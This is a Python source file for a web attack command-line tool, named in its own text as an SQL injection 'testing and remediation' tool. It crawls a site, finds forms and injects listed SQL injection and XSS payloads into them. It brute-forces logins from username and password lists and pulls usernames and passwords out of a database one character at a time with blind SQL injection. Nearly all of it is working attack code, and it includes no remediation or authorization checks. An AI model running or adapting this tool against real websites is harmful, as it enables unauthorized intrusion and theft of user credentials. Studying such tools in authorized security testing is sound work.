import argparse
import requests
import urllib.parse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from collections import deque
import os
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.theme import Theme
import datetime

# Set up a custom theme for colors
custom_theme = Theme({
    "success": "green",
    "error": "bold red",
    "warning": "yellow",
    "info": "cyan",
    "payload": "magenta",
    "highlight": "bold blue"
})
console = Console(theme=custom_theme)

ASCII_BANNER = r'''
[bold purple] __________________               .__            [/]
[bold purple] \____    /\_____  \___.__.______ |  |_________  [/]
[bold purple]   /     /   _(__  <   |  |\____ \|  |  \_  __ \ [/]
[bold purple]  /     /_  /       \___  ||  |_> >   Y  \  | \/ [/]
[bold purple] /_______ \/______  / ____||   __/|___|  /__|    [/]
[bold purple]         \/       \/\/     |__|        \/        [/]
'''

# Common SQL injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1-- ",
    '" OR 1=1-- ',
    "' OR 'a'='a",
    '" OR "a"="a',
    "' OR ''='",
    '" OR ""="',
    "'--",
    '"--',
]

# Common XSS payloads
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '" onmouseover=alert(1) x="',
    "'><img src=x onerror=alert(1)>",
    '<svg/onload=alert(1)>',
    '<b>XSS</b>',
]

def test_sqli(url, params, method="GET", results=None):
    console.print("\n[+] Starting SQL Injection tests...", style="info")
    vulnerable = False
    param_pairs = [p for p in params.split('&') if '=' in p]
    baseline_params = {p.split('=')[0]: p.split('=')[1] for p in param_pairs}
    if method.upper() == "POST":
        baseline_resp = requests.post(url, data=baseline_params, timeout=5)
    else:
        baseline_resp = requests.get(url, params=baseline_params, timeout=5)
    baseline_text = baseline_resp.text
    found_vulns = []
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console, transient=True) as progress:
        task = progress.add_task("Testing SQLi payloads...", total=len(param_pairs) * len(SQLI_PAYLOADS))
        for i, pair in enumerate(param_pairs):
            k, v = pair.split('=', 1)
            for payload in SQLI_PAYLOADS:
                test_params = {p.split('=')[0]: p.split('=')[1] for p in param_pairs}
                test_params[k] = v + payload
                try:
                    if method.upper() == "POST":
                        resp = requests.post(url, data=test_params, timeout=5)
                    else:
                        resp = requests.get(url, params=test_params, timeout=5)
                    if is_sqli_response(resp.text):
                        found_vulns.append(f"[bold]{k}[/] with payload: [payload]{payload}[/] ([error]SQL error detected[/])")
                    elif resp.text != baseline_text:
                        found_vulns.append(f"[bold]{k}[/] with payload: [payload]{payload}[/] ([warning]response changed[/])")
                    if "Login successful!" in resp.text and "Login successful!" not in baseline_text:
                        found_vulns.append(f"[success][!!!] Authentication bypassed using {k} with payload: {payload}[/]")
                except Exception:
                    pass
                progress.advance(task)
    if results is not None:
        results['sqli'] = found_vulns
    if not found_vulns:
        console.print("[-] No SQL injection vulnerabilities detected with basic payloads.", style="success")

def is_sqli_response(response_text):
    # Basic error-based detection (can be expanded)
    errors = [
        'You have an error in your SQL syntax',
        'Warning: mysql_',
        'Unclosed quotation mark',
        'quoted string not properly terminated',
        'SQLSTATE',
    ]
    for error in errors:
        if error.lower() in response_text.lower():
            return True
    return False

def test_xss(url, params, method="GET", results=None):
    console.print("\n[+] Starting XSS tests...", style="info")
    param_pairs = [p for p in params.split('&') if '=' in p]
    found_xss = []
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console, transient=True) as progress:
        task = progress.add_task("Testing XSS payloads...", total=len(param_pairs) * len(XSS_PAYLOADS))
        for i, pair in enumerate(param_pairs):
            k, v = pair.split('=', 1)
            for payload in XSS_PAYLOADS:
                test_params = {p.split('=')[0]: p.split('=')[1] for p in param_pairs}
                test_params[k] = payload
                try:
                    if method.upper() == "POST":
                        resp = requests.post(url, data=test_params, timeout=5)
                    else:
                        resp = requests.get(url, params=test_params, timeout=5)
                    # Check if payload is reflected in response
                    if payload in resp.text:
                        found_xss.append(f"[bold]{k}[/] with payload: [payload]{payload}[/] ([error]reflected[/])")
                except Exception:
                    pass
                progress.advance(task)
    if results is not None:
        results['xss'] = found_xss
    if not found_xss:
        console.print("[-] No XSS vulnerabilities detected with basic payloads.", style="success")

def brute_force_login(url, form_params, method="POST", success_indicator="Login successful!", results=None, user_file=None, pass_file=None):
    console.print("\n[+] Starting brute-force credential testing...", style="info")
    username_field = None
    password_field = None
    for pair in form_params.split('&'):
        if '=' in pair:
            k, _ = pair.split('=', 1)
            if 'user' in k.lower():
                username_field = k
            if 'pass' in k.lower():
                password_field = k
    if not username_field or not password_field:
        console.print("[!] Could not identify username/password fields for brute-force.", style="error")
        return
    if not user_file or not os.path.exists(user_file):
        console.print("[!] Username list file (--userlist) is required for brute-force and was not found.", style="error")
        return
    if not pass_file or not os.path.exists(pass_file):
        console.print("[!] Password list file (--passlist) is required for brute-force and was not found.", style="error")
        return
    with open(user_file, 'r', encoding='utf-8') as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(pass_file, 'r', encoding='utf-8') as f:
        passwords = [line.strip() for line in f if line.strip()]
    found_creds = []
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console, transient=True) as progress:
        task = progress.add_task("Brute-forcing credentials...", total=len(usernames) * len(passwords))
        for username in usernames:
            for password in passwords:
                params = {username_field: username, password_field: password}
                try:
                    if method.upper() == "POST":
                        resp = requests.post(url, data=params, timeout=5)
                    else:
                        resp = requests.get(url, params=params, timeout=5)
                    if success_indicator.lower() in resp.text.lower():
                        found_creds.append(f"[success]{username_field}='{username}', {password_field}='{password}'[/]")
                        if results is not None:
                            results['creds'] = found_creds
                        return
                except Exception as e:
                    console.print(f"[!] Error testing {username}/{password}: {e}", style="warning")
                progress.advance(task)
    if results is not None:
        results['creds'] = found_creds
    console.print("[-] No valid credentials found with provided username/password lists.", style="success")

def blind_sqli_extract(url, form_params, method="POST", success_indicator="Login successful!", max_length=20, max_users=5, results=None):
    print("\n[+] Starting blind SQLi extraction (fresh crack, multi-user)...")
    username_field = None
    password_field = None
    for pair in form_params.split('&'):
        if '=' in pair:
            k, _ = pair.split('=', 1)
            if 'user' in k.lower():
                username_field = k
            if 'pass' in k.lower():
                password_field = k
    if not username_field or not password_field:
        print("[!] Could not identify username/password fields for blind SQLi.")
        return
    extracted_creds = []
    for user_idx in range(max_users):
        extracted_username = ''
        extracted_password = ''
        # Extract username character by character
        print(f"[+] Extracting username for user #{user_idx+1} via blind SQLi...")
        for i in range(1, max_length+1):
            found = False
            for c in range(32, 127):  # Printable ASCII
                payload = f"' OR substr((SELECT username FROM users LIMIT 1 OFFSET {user_idx}),{i},1)='{chr(c)}'--"
                params = {username_field: payload, password_field: 'test'}
                try:
                    if method.upper() == "POST":
                        resp = requests.post(url, data=params, timeout=5)
                    else:
                        resp = requests.get(url, params=params, timeout=5)
                    if success_indicator.lower() in resp.text.lower():
                        extracted_username += chr(c)
                        print(f"[+] Username so far: {extracted_username}")
                        found = True
                        break
                except Exception as e:
                    print(f"[!] Error during blind SQLi username extraction: {e}")
            if not found:
                break
        if not extracted_username:
            break  # No more users
        print(f"[+] Extracted username: {extracted_username}")
        # Extract password character by character
        print(f"[+] Extracting password for user #{user_idx+1} via blind SQLi...")
        for i in range(1, max_length+1):
            found = False
            for c in range(32, 127):
                payload = f"' OR substr((SELECT password FROM users LIMIT 1 OFFSET {user_idx}),{i},1)='{chr(c)}'--"
                params = {username_field: extracted_username, password_field: payload}
                try:
                    if method.upper() == "POST":
                        resp = requests.post(url, data=params, timeout=5)
                    else:
                        resp = requests.get(url, params=params, timeout=5)
                    if success_indicator.lower() in resp.text.lower():
                        extracted_password += chr(c)
                        print(f"[+] Password so far: {extracted_password}")
                        found = True
                        break
                except Exception as e:
                    print(f"[!] Error during blind SQLi password extraction: {e}")
            if not found:
                break
        print(f"[+] Extracted password: {extracted_password}")
        extracted_creds.append(f"{username_field}='{extracted_username}', {password_field}='{extracted_password}'")
    if results is not None:
        results['creds'] = extracted_creds

def auto_test_forms(url, crack_lists=False, fresh_crack=False, results=None, user_file=None, pass_file=None):
    print(f"[+] Fetching {url} and searching for forms...")
    try:
        resp = requests.get(url, timeout=5)
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = soup.find_all('form')
        if not forms:
            print("[-] No forms found on the page.")
            return
        page_results = []
        for idx, form in enumerate(forms, 1):
            action = form.get('action')
            method = form.get('method', 'get').upper()
            inputs = form.find_all('input')
            params = []
            for inp in inputs:
                name = inp.get('name')
                if name:
                    params.append(f"{name}=test")
            param_str = '&'.join(params)
            form_url = requests.compat.urljoin(url, action) if action else url
            print(f"\n[+] Testing form #{idx}: {form_url} [{method}] with params: {param_str}")
            form_result = {'url': form_url, 'sqli': [], 'creds': [], 'xss': []}
            test_sqli(form_url, param_str, method, results=form_result)
            test_xss(form_url, param_str, method, results=form_result)
            if crack_lists:
                brute_force_login(form_url, param_str, method, results=form_result, user_file=user_file, pass_file=pass_file)
            elif fresh_crack:
                blind_sqli_extract(form_url, param_str, method, results=form_result)
            page_results.append(form_result)
        if results is not None:
            results['pages'] = page_results
    except Exception as e:
        print(f"[!] Error fetching or parsing forms: {e}")

def crawl_and_test(start_url, max_pages=10, crack_lists=False, fresh_crack=False, results=None, skip_urls=None, user_file=None, pass_file=None):
    print(f"[+] Starting crawl from {start_url}")
    visited = set() if skip_urls is None else set(skip_urls)
    queue = deque([start_url])
    pages_tested = 0
    crawl_results = []
    def normalize_url(url):
        # Remove trailing slash and default port
        parsed = urlparse(url)
        netloc = parsed.netloc.split(':')[0]
        return parsed._replace(netloc=netloc, path=parsed.path.rstrip('/')).geturl()
    while queue and pages_tested < max_pages:
        url = queue.popleft()
        url_norm = normalize_url(url)
        if url_norm in visited:
            continue
        visited.add(url_norm)
        try:
            resp = requests.get(url, timeout=5)
            soup = BeautifulSoup(resp.text, 'html.parser')
            print(f"\n[+] Crawling and testing: {url}")
            page_result = {}
            auto_test_forms(url, crack_lists=crack_lists, fresh_crack=fresh_crack, results=page_result, user_file=user_file, pass_file=pass_file)
            crawl_results.append({'url': url, 'pages': page_result.get('pages', [])})
            pages_tested += 1
            # Find and enqueue internal links
            for link in soup.find_all('a', href=True):
                link_url = urljoin(url, link['href'])
                link_url_norm = normalize_url(link_url)
                if urlparse(link_url).netloc == urlparse(start_url).netloc and link_url_norm not in visited and link_url_norm not in queue:
                    queue.append(link_url)
        except Exception as e:
            print(f"[!] Error crawling {url}: {e}")
    if results is not None:
        results['crawl'] = crawl_results

class CustomArgumentParser(argparse.ArgumentParser):
    def error(self, message):
        console.print(f"\n[bold red]Argument error:[/] {message}\n", style="error")
        self.print_help()
        console.print("\n[bold green]Press [Enter] to exit...[/]")
        input()
        exit(2)

def main():
    console.print(ASCII_BANNER)
    today = datetime.datetime.now().strftime('%Y-%m-%d')
    console.print(f"[bold]Welcome to the SQL Injection Testing and Remediation CLI Tool![/]", style="info")
    console.print(f"[dim]Author: Noah Rogers | Date: {today}[/]\n", style="info")
    parser = CustomArgumentParser(
        description="SQL Injection Testing and Remediation CLI Tool"
    )
    parser.add_argument('--url', type=str, help='Target URL to test', required=False)
    parser.add_argument('--params', type=str, help='Parameters to test (e.g., "id=1")')
    parser.add_argument('--method', type=str, choices=['GET', 'POST'], default='GET', help='HTTP method to use (GET or POST)')
    parser.add_argument('--auto', action='store_true', help='Automatically find and test forms on the page (with blind SQLi by default)')
    parser.add_argument('--crawl', action='store_true', help='Crawl the site and test forms on each page')
    parser.add_argument('--max-pages', type=int, default=10, help='Maximum number of pages to crawl')
    parser.add_argument('--crack_lists', action='store_true', help='Brute-force with common username/password lists')
    parser.add_argument('--fresh_crack', action='store_true', help='Extract credentials using blind SQLi only')
    parser.add_argument('--userlist', type=str, help='File with usernames for brute-force (one per line)')
    parser.add_argument('--passlist', type=str, help='File with passwords for brute-force (one per line)')
    args = parser.parse_args()

    if not args.url:
        console.print("[bold red]Error:[/] The --url argument is required to run tests.", style="error")
        parser.print_help()
        console.print("\n[bold green]Press [Enter] to exit...[/]")
        input()
        return

    console.print(f"Testing {args.url}", style="highlight")
    results = {}
    tested_urls = set()
    # If both --auto and --crawl are set, avoid duplicate testing
    if args.auto and args.crawl:
        auto_test_forms(args.url, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, user_file=args.userlist, pass_file=args.passlist)
        tested_urls.add(args.url.rstrip('/'))
        crawl_and_test(args.url, args.max_pages, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, skip_urls=tested_urls, user_file=args.userlist, pass_file=args.passlist)
    elif args.auto:
        auto_test_forms(args.url, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, user_file=args.userlist, pass_file=args.passlist)
    elif args.crawl:
        crawl_and_test(args.url, args.max_pages, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, user_file=args.userlist, pass_file=args.passlist)
    elif args.params:
        single_result = {'url': args.url, 'sqli': [], 'creds': []}
        test_sqli(args.url, args.params, args.method, results=single_result)
        results = {'pages': [single_result]}
    else:
        console.print("[!] Please provide either --params, --auto, or --crawl.", style="error")
        return
    # Output summary
    console.print("\n========== SUMMARY ==========", style="highlight")
    console.print("Note: '[i] Response changed for payload, but this does NOT confirm SQL injection' means the page output changed, but this is not a confirmed vulnerability. Only '[!] Potential SQL Injection (SQL error)' or authentication bypasses are strong indicators of SQLi.\n", style="info")
    if 'pages' in results:
        for page in results['pages']:
            console.print(f"\n[Page: {page['url']}]", style="highlight")
            console.print("SQL Injection findings:", style="info")
            if page.get('sqli'):
                for vuln in page.get('sqli', []):
                    if '(SQL error detected)' in vuln:
                        console.print(f"  [!] Potential SQL Injection (SQL error): {vuln}", style="error")
                    elif '(response changed)' in vuln:
                        console.print(f"  [i] Response changed for payload, but this does NOT confirm SQL injection: {vuln}", style="warning")
                    else:
                        console.print(f"  [!] Potential SQL Injection: {vuln}", style="error")
            else:
                console.print("  None found", style="success")
            console.print("XSS findings:", style="info")
            if page.get('xss'):
                for xss in page.get('xss', []):
                    if '(reflected)' in xss:
                        console.print(f"  [!] Potential XSS (payload reflected): {xss}", style="error")
                    else:
                        console.print(f"  [!] Potential XSS: {xss}", style="error")
                for xss in page.get('xss', []):
                    if ' with payload: ' in xss:
                        param, rest = xss.split(' with payload: ', 1)
                        payload = rest.split(' (')[0]
                        method = 'GET'
                        if '[POST]' in page['url']:
                            method = 'POST'
                        if method == 'GET' or page['url'].endswith('/profile'):
                            poc_url = f"{page['url']}?{param}={requests.utils.quote(payload)}"
                            console.print(f"    [POC] {poc_url}", style="payload")
                        else:
                            console.print(f"    [POC] curl -X POST '{page['url']}' -d '{param}={payload}'", style="payload")
            else:
                console.print("  None found", style="success")
            console.print("Validated credentials:", style="info")
            for cred in page.get('creds', []):
                console.print(f"  - {cred}", style="success")
    if 'crawl' in results:
        for crawl_page in results['crawl']:
            console.print(f"\n[Crawled Page: {crawl_page['url']}]", style="highlight")
            for page in crawl_page.get('pages', []):
                console.print(f"  [Form: {page['url']}]", style="highlight")
                console.print("  SQL Injection findings:", style="info")
                if page.get('sqli'):
                    for vuln in page.get('sqli', []):
                        if '(SQL error detected)' in vuln:
                            console.print(f"    [!] Potential SQL Injection (SQL error): {vuln}", style="error")
                        elif '(response changed)' in vuln:
                            console.print(f"    [i] Response changed for payload, but this does NOT confirm SQL injection: {vuln}", style="warning")
                        else:
                            console.print(f"    [!] Potential SQL Injection: {vuln}", style="error")
                else:
                    console.print("    None found", style="success")
                console.print("  XSS findings:", style="info")
                if page.get('xss'):
                    for xss in page.get('xss', []):
                        if '(reflected)' in xss:
                            console.print(f"    [!] Potential XSS (payload reflected): {xss}", style="error")
                        else:
                            console.print(f"    [!] Potential XSS: {xss}", style="error")
                else:
                    console.print("    None found", style="success")
                console.print("  Validated credentials:", style="info")
                for cred in page.get('creds', []):
                    console.print(f"    - {cred}", style="success")
    console.print("============================\n", style="highlight")
    console.print("\n[bold green]Press [Enter] to exit...[/]")
    input()

if __name__ == "__main__":
    main()
